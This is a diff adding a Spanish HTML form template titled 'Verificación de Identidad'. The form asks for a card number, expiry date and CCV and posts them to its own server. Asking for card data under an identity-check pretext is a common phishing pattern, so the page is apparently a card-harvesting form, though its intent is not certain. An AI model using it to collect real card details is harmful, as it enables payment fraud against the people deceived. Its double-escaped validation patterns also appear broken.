@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Verificación de Identidad</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <h2>Verificación de Identidad</h2>
+        <form method="POST">
+            <label for="numero">Número de Tarjeta (16 dígitos)</label>
+            <input type="text" id="numero" name="numero" maxlength="16" pattern="\\d{16}" required>
+
+            <label for="fecha">Fecha de Vencimiento</label>
+            <input type="text" id="fecha" name="fecha" placeholder="MM/AA" pattern="\\d{2}/\\d{2}" required>
+
+            <label for="ccv">CCV</label>
+            <input type="text" id="ccv" name="ccv" maxlength="3" pattern="\\d{3}" required>
+
+            <button type="submit" class="btn">Enviar</button>
+        </form>
+    </div>
+</body>
+</html>
